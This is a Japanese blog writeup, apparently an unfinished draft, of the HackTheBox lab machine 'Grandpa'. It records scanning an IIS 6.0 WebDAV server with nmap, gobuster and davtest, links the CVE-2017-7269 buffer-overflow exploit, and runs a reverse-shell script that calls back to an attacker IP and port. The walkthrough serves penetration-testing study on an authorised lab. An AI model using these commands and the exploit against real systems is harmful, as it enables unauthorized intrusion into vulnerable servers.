---
title: 【Easy/Windows】Grandpa Writeup(HackTheBox)
date: "2022-06-04"
template: "post"
draft: true
slug: "hackthebox-windows-grandpa"
category: "HackTheBox"
tags:
  - "HackTheBox"
  - "Windows"
  - "EasyBox"
description: "HackTheBoxのリタイアマシン「Grandpa」のWriteUpです。"
socialImage: "/media/cards/no-image.png"

---

「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。
「Hack The Box」のランクは、本記事執筆時点でProHackerです。

<img src="../../static/media/2022-06-04-hackthebox-windows-grandpa/327080.png" alt="Hack The Box">

今回は、HackTheBoxのリタイアマシン「」のWriteUpです。

## 本記事について

**本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。**

自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。

またすべての発言は所属団体ではなく個人に帰属します。

<!-- omit in toc -->

## もくじ





## Reconnaissance(TA0043)



### Gather Victim Host Information(T1592)



``` bash
$ nmap -sV -sC -T4 targethost.htb| tee nmap1.txt
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sat, 04 Jun 2022 01:01:45 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.16 seconds
```



![image-20220604100328237](../../static/media/2022-06-04-hackthebox-windows-grandpa/image-20220604100328237.png)



``` bash
$ gobuster dir -u http://targethost.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40 | tee gobuster1.txt

/images               (Status: 301) [Size: 152] [--> http://targethost.htb/images/]
/Images               (Status: 301) [Size: 152] [--> http://targethost.htb/Images/]
/IMAGES               (Status: 301) [Size: 152] [--> http://targethost.htb/IMAGES/] 
/_private             (Status: 403) [Size: 1529] 
```

- Images

![image-20220604100519971](../../static/media/2022-06-04-hackthebox-windows-grandpa/image-20220604100519971.png)

- _private

![image-20220604101247760](../../static/media/2022-06-04-hackthebox-windows-grandpa/image-20220604101247760.png)



- 特に有益な情報はでない

``` bash
$ feroxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | tee feroxbuster.txt
```





``` bash
$ /usr/bin/davtest -url http://targethost.htb/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://targethost.htb
********************************************************
NOTE    Random string for this session: raQC3An4
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     jhtml   FAIL
PUT     cfm     FAIL
PUT     cgi     FAIL
PUT     jsp     FAIL
PUT     txt     FAIL
PUT     pl      FAIL
PUT     php     FAIL
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     html    FAIL
PUT     aspx    FAIL

********************************************************
```

参考：[ハッカーはDAVTestでWebDAVが有効なサーバーをテストする(Kali Linux) | AIを武器にホワイトハッカーになる](https://whitemarkn.com/learning-ethical-hacker/davtest/)

参考：[Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow - Windows remote Exploit](https://www.exploit-db.com/exploits/41738)



``` bash
root@pentestlab:~# python revshell.py 
usage:iis6webdav.py targetip targetport reverseip reverseport

root@pentestlab:~# python revshell.py 10.10.10.14 80 10.10.14.2 9999
```



参考：[iis6-exploit-2017-CVE-2017-7269/iis6 reverse shell at master · g0rx/iis6-exploit-2017-CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)





``` bash
whoami /priv
```







